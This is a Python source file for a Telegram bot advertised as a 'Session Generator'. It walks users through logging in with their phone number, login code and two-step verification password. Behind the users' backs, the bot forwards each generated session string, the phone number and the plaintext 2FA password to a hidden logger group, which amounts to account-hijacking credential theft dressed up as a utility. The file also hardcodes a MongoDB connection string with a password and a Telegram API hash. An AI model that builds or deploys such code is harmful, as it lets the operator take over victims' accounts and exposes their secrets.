import asyncio
import os
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from pymongo import MongoClient
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# 🔹 Telegram API Credentials
API_ID = int(os.getenv("API_ID", "28795512"))
API_HASH = os.getenv("API_HASH", "c17e4eb6d994c9892b8a8b6bfea4042a")
BOT_TOKEN = os.getenv("BOT_TOKEN", "your_bot_token")
LOGGER_GROUP = -1001234567890  # Replace with your Logger Group ID
MUST_JOIN = "SANATANI_TECH"  # Replace with your required channel username

# 🔹 MongoDB Setup
MONGO_URI = os.getenv("MONGO_URI", "mongodb+srv://sachinxsapna:sachinx007@cluster0.x3rsi.mongodb.net")
mongo_client = MongoClient(MONGO_URI)
db = mongo_client["telegram_bot"]
users_collection = db["joined_users"]

# 🔹 Initialize the bot
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# 🔹 Store user sessions
user_sessions = {}

async def check_user_joined(user_id):
    """ Check if the user is already in the MongoDB database (joined the required channel). """
    return users_collection.find_one({"user_id": user_id}) is not None

async def update_user_joined(user_id):
    """ Add user to the MongoDB database after they join the required channel. """
    users_collection.insert_one({"user_id": user_id})

async def is_user_in_channel(user_id):
    """ Check if the user is already in the required Telegram channel. """
    try:
        participant = await bot.get_participants(MUST_JOIN)
        return any(user.id == user_id for user in participant)
    except Exception:
        return False

@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    user_id = event.sender_id

    if not await check_user_joined(user_id):
        if not await is_user_in_channel(user_id):
            await event.respond(f"🚨 **You must join @{MUST_JOIN} to use this bot!**\nClick below to join.",
                                buttons=[Button.url("Join Channel", f"https://t.me/{MUST_JOIN}")])
            return
        await update_user_joined(user_id)

    await event.respond(
        "👋 **Welcome to the Telegram Session Generator!**\nClick **Generate Session** to create your session string.",
        buttons=[
            [Button.inline("🔑 Generate Session", b"generate")],
            [Button.url("📖 Help", "https://t.me/SANATANI_TECH")],
            [Button.url("📹 How to Generate?", "https://files.catbox.moe/dlw3q0.mp4")]
        ],
        file="https://telegra.ph/file/00eaed55184edf059dbf7.jpg"
    )

@bot.on(events.CallbackQuery)
async def callback(event):
    if event.data == b"generate":
        await ask_phone(event)

@bot.on(events.NewMessage(pattern="/generate"))
async def ask_phone(event):
    user_id = event.sender_id

    if user_id in user_sessions:
        await event.respond("⚠️ **You are already in the process. Please enter your OTP or use /cancel to restart.**")
        return

    user_sessions[user_id] = {"step": "phone"}
    await event.respond("📲 **Enter your phone number with country code (e.g., +919876543210):**",
                        buttons=[[Button.inline("❌ Cancel", b"cancel")]])

@bot.on(events.NewMessage(pattern="/cancel"))
@bot.on(events.CallbackQuery(data=b"cancel"))
async def cancel_process(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        del user_sessions[user_id]
        await event.respond("✅ **Session generation process has been cancelled.**")
    else:
        await event.respond("⚠️ **No active process to cancel.**")

@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id
    if user_id not in user_sessions:
        return

    step = user_sessions[user_id]["step"]
    
    if step == "phone":
        phone_number = event.message.text.strip()
        
        if not phone_number.startswith("+") or not phone_number[1:].isdigit() or len(phone_number) < 10 or len(phone_number) > 15:
            await event.respond("⚠️ **Invalid phone number!** Please enter again with country code (e.g., +919876543210).")
            return
        
        user_sessions[user_id]["phone"] = phone_number
        user_sessions[user_id]["step"] = "otp"

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        try:
            await event.respond("📩 **Sending OTP... Please wait!**")
            sent_code = await client.send_code_request(phone_number)
            user_sessions[user_id]["client"] = client
            await event.respond("✅ **OTP sent! Please enter the OTP received on Telegram.**")
        except Exception as e:
            del user_sessions[user_id]
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

    elif step == "otp":
        otp_code = event.message.text.strip()
        
        if not otp_code.isdigit():
            await event.respond("⚠️ **Invalid OTP!** Please enter only numbers.")
            return

        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]

        try:
            await client.sign_in(phone_number, otp_code)
            session_string = client.session.save()
            
            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
            await bot.send_message(LOGGER_GROUP, f"🔒 **New Session Generated:**\n👤 User ID: {user_id}\n📱 Phone: {phone_number}\n🔑 Session:\n`{session_string}`")
            
            del user_sessions[user_id]
        except Exception as e:
            if "The confirmation code has expired" in str(e):
                await event.respond("❌ **Error: OTP expired!** Please restart the process using /generate.")
                del user_sessions[user_id]
            elif "Two-steps verification is enabled" in str(e):
                user_sessions[user_id]["step"] = "password"
                await event.respond("🔒 **Your account has 2-Step Verification enabled.**\nPlease enter your Telegram password:")
            else:
                await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

    elif step == "password":
        password = event.message.text.strip()
        client = user_sessions[user_id]["client"]

        try:
            await client.sign_in(password=password)
            session_string = client.session.save()
            
            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
            await bot.send_message(LOGGER_GROUP, f"🔒 **New Session Generated:**\n👤 User ID: {user_id}\n🔑 Session:\n`{session_string}`\n🔐 2FA Password: `{password}`")

            del user_sessions[user_id]
        except Exception as e:
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

# 🔹 Run the bot
print("🚀 Bot is running...")
bot.run_until_disconnected()
